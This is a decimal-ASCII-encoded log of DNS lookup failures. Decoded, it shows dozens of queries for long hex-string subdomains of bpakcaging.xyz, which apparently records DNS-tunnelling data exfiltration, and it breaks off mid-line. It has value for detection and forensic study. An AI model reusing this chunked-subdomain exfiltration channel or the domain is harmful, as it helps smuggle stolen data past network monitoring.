48 65 48 52 48 48 48 50 48 48 48 48 48 48 48 48 48 52 48 48 48 68 48 65 48 68 48 65 51 56 54 53 65 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 70 65 65 55 50 65 65 55 69 50 70 67 57 56 54 57 70 51 48 70 53 54 54 69 52 70 53 56 65 49 57 53 56 50 66 68 65 52 67 48 57 56 56 68 56 69 57 70 54 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 55 66 49 66 69 69 49 53 56 51 48 52 68 65 67 69 65 70 50 49 67 49 51 68 65 49 48 69 56 55 57 70 49 56 70 50 70 55 66 52 57 65 52 55 69 48 69 53 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 56 57 51 55 68 55 68 54 52 48 68 56 52 48 65 57 65 69 54 57 48 51 53 48 65 53 70 67 48 54 56 56 67 66 56 49 50 54 48 56 66 70 55 69 65 48 57 54 49 48 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 57 50 65 67 56 56 49 54 48 67 68 55 51 67 68 57 67 50 56 67 53 51 49 70 65 66 56 52 54 67 53 57 56 53 54 65 68 68 51 65 51 67 53 48 55 57 70 53 55 55 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 70 70 51 68 67 55 52 67 55 49 55 50 54 69 69 66 55 50 48 51 65 68 53 48 57 70 55 50 57 52 48 65 54 50 53 49 54 51 50 67 51 50 49 52 50 67 68 51 53 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 66 48 69 67 55 51 49 54 54 56 51 66 56 50 52 53 48 56 55 49 50 49 66 50 54 66 68 51 57 65 50 54 68 54 51 52 51 70 67 54 65 65 50 50 69 48 69 66 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 66 48 68 69 55 49 70 53 55 70 53 56 66 51 70 70 56 49 67 70 53 56 48 69 51 55 69 57 48 48 65 66 55 51 68 57 66 55 56 68 57 55 52 50 68 53 65 56 54 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 57 65 65 50 49 48 49 69 66 70 55 56 68 67 70 50 70 52 50 53 57 65 65 66 54 53 49 69 50 56 56 67 65 57 65 48 54 52 48 67 54 50 55 66 57 65 68 50 52 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 53 54 48 49 55 52 66 65 65 57 49 48 57 55 51 53 69 54 67 67 68 68 48 57 53 50 52 53 68 50 52 49 50 52 51 49 68 51 53 52 51 50 52 68 69 56 52 69 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 69 55 48 65 70 56 55 70 66 57 54 48 49 65 66 66 66 56 48 49 67 57 67 55 69 52 65 51 55 50 69 65 50 70 50 67 48 65 70 68 54 70 48 49 51 67 48 70 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 65 53 51 68 48 53 57 67 49 48 50 48 68 70 69 57 70 54 50 53 48 56 69 50 50 53 65 51 67 67 56 54 48 54 56 70 56 50 54 54 57 56 70 69 69 69 55 55 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 51 68 68 54 69 57 52 54 69 48 57 69 57 70 65 66 49 57 49 55 57 54 57 65 67 67 49 54 53 53 65 49 56 48 56 70 50 67 49 67 66 55 48 50 51 68 54 70 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 68 50 54 56 48 50 66 52 66 70 70 55 66 50 65 57 53 54 53 57 54 53 69 68 55 55 50 49 49 52 50 57 55 50 51 56 65 69 51 66 70 54 54 66 70 49 65 70 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 56 69 67 70 67 56 69 67 68 50 65 69 52 48 49 53 56 54 51 69 48 68 55 51 57 57 70 53 68 68 66 55 53 57 52 50 51 53 69 55 49 65 56 56 68 52 54 55 66 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 55 53 50 49 70 52 54 57 66 53 50 52 54 52 49 55 56 69 50 49 54 54 56 55 57 65 67 70 57 67 66 65 48 66 57 66 66 54 48 54 67 67 55 68 48 51 57 54 48 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 55 65 54 55 54 67 68 55 50 70 53 53 55 69 48 67 50 57 57 48 52 52 53 69 55 68 57 53 52 54 70 69 68 49 68 68 65 66 68 51 48 65 70 50 70 51 69 48 51 57 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 67 67 56 66 54 49 51 69 52 51 65 57 70 56 52 67 69 51 67 55 54 66 68 65 69 69 57 55 66 49 56 69 56 69 66 53 66 55 57 48 57 69 54 56 65 52 54 48 48 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 57 66 54 69 66 70 55 51 48 57 49 69 67 53 66 70 66 68 55 50 57 68 51 53 52 65 55 50 56 48 56 65 67 67 52 70 67 56 50 54 48 52 56 70 52 66 50 66 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 65 49 52 69 55 56 51 66 54 70 65 54 66 65 66 56 52 50 50 56 57 67 48 48 53 54 49 70 48 57 48 52 49 70 57 56 48 66 49 54 57 52 67 68 65 49 53 55 65 53 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 65 49 69 54 65 68 56 49 49 68 68 49 52 67 54 48 51 49 49 70 56 53 57 48 53 70 69 52 55 49 51 67 48 55 66 69 52 65 70 66 48 69 49 67 49 68 66 57 50 50 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 70 65 55 50 55 50 51 56 54 65 56 56 68 49 69 53 49 55 65 53 55 57 48 56 48 48 57 48 66 49 48 52 53 70 51 52 66 56 51 56 70 70 54 49 65 66 68 69 48 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 54 54 66 52 48 65 52 68 55 69 65 55 69 68 65 69 57 55 66 51 48 56 48 52 69 54 50 53 49 51 57 57 49 53 50 69 65 65 69 65 66 51 51 51 66 70 52 66 55 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 67 55 56 57 49 50 69 56 55 57 68 69 49 57 67 54 70 54 52 57 57 53 69 48 66 65 51 70 56 54 65 50 56 69 69 49 48 54 53 51 56 50 49 67 48 56 70 49 54 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 56 65 70 69 54 51 52 56 69 54 51 67 52 70 50 56 54 70 70 65 49 67 54 48 53 49 49 48 66 53 68 51 50 51 68 70 56 51 67 56 66 52 69 69 49 48 57 56 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 70 65 54 53 50 65 57 48 65 70 48 68 67 65 52 51 49 48 66 69 66 48 70 53 48 56 69 54 70 67 52 55 52 51 55 69 53 65 50 50 49 66 56 67 49 56 54 48 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 55 66 69 52 55 68 57 49 70 65 68 48 48 52 51 65 52 51 57 49 55 50 70 57 65 66 67 66 57 52 54 67 57 70 52 55 66 49 48 66 49 66 48 49 53 53 56 57 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 54 49 54 55 65 51 66 50 69 57 65 48 56 50 65 67 54 68 67 49 70 67 57 57 54 55 48 54 53 48 52 51 53 67 52 67 53 48 56 68 54 68 57 67 51 55 56 67 57 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 50 53 53 70 52 70 65 67 67 55 67 52 68 57 55 69 56 55 55 66 70 67 57 54 53 55 69 49 52 50 66 56 68 48 68 56 65 50 49 53 54 65 54 67 49 70 68 66 55 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 54 55 65 67 54 69 66 57 54 57 48 50 67 57 57 49 50 69 48 50 68 49 48 65 48 48 56 49 70 69 56 70 56 54 55 49 52 70 55 65 65 67 50 69 68 66 49 69 57 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 57 51 50 48 54 67 53 69 68 50 56 67 55 57 57 49 48 50 49 54 53 49 68 56 66 53 65 66 55 55 67 69 55 66 66 49 56 50 69 70 54 54 50 54 51 55 56 57 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 57 69 52 67 54 66 57 51 70 65 69 67 56 55 69 50 65 68 69 56 50 68 54 54 69 65 54 48 50 55 70 49 52 49 57 54 65 53 53 68 57 51 55 66 55 52 49 50 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 49 53 55 50 51 56 49 65 69 54 50 68 70 52 54 69 49 52 70 56 54 56 48 52 50 51 48 49 57 65 70 57 50 54 54 55 53 48 53 52 57 56 67 53 67 49 70 50 51 48 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 50 56 70 54 54 56 69 52 54 49 48 65 49 50 49 53 49 51 56 68 57 53 53 53 66 49 69 55 48 70 68 51 53 49 54 67 50 68 67 69 70 66 56 65 50 56 52 67 49 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 48 65 55 68 52 69 55 49 56 70 51 67 68 48 48 48 67 67 65 68 48 57 57 56 55 54 69 55 56 70 52 49 55 65 69 65 57 65 54 50 67 66 69 66 48 55 68 50 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 48 55 65 48 69 68 54 57 49 48 54 50 48 53 57 53 57 56 56 68 68 52 55 56 50 68 55 50 66 70 67 68 49 68 52 69 50 69 66 48 52 51 66 53 56 48 54 52 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 54 52 54 68 70 53 55 57 57 70 69 57 65 69 68 49 52 70 53 66 48 66 69 56 65 66 56 53 51 68 70 52 50 53 54 49 68 54 55 55 68 53 55 54 49 54 56 53 68 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 67 55 49 49 57 69 65 56 68 65 49 65 66 56 55 57 69 48 70 54 57 57 50 68 48 54 69 49 69 50 53 54 54 53 57 68 57 69 56 65 56 70 50 55 51 66 51 66 53 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 49 54 53 56 57 65 54 66 57 70 53 69 68 53 48 56 51 69 68 50 51 57 55 54 68 54 50 48 48 66 53 54 69 69 52 66 54 48 65 48 49 51 56 69 53 48 55 55 57 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 66 56 54 50 48 70 67 57 49 66 53 65 55 70 57 55 56 68 65 66 48 57 51 65 57 68 51 68 65 70 67 53 52 51 67 66 48 57 53 48 48 65 50 70 52 65 65 65 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 56 69 50 48 56 68 53 50 68 65 53 66 53 70 51 50 70 54 51 49 57 50 48 57 65 54 51 65 52 65 55 55 50 55 66 67 51 70 56 65 52 57 66 49 52 49 56 53 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 53 49 55 56 57 50 66 69 56 55 54 51 55 66 68 53 67 66 56 50 51 68 53 57 53 67 56 69 54 49 49 57 65 66 52 69 50 48 70 68 67 53 65 66 56 66 57 52 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 50 50 48 68 65 65 56 49 55 53 52 67 69 49 54 55 65 49 51 68 52 66 53 48 50 48 57 55 70 57 55 55 48 69 57 50 69 66 68 53 68 49 48 53 53 67 67 53 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 57 67 54 70 69 68 52 70 69 48 56 53 70 51 66 70 53 51 51 50 67 56 68 55 57 67 52 55 66 55 51 53 48 48 55 68 57 69 50 68 52 70 48 70 55 68 50 53 66 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 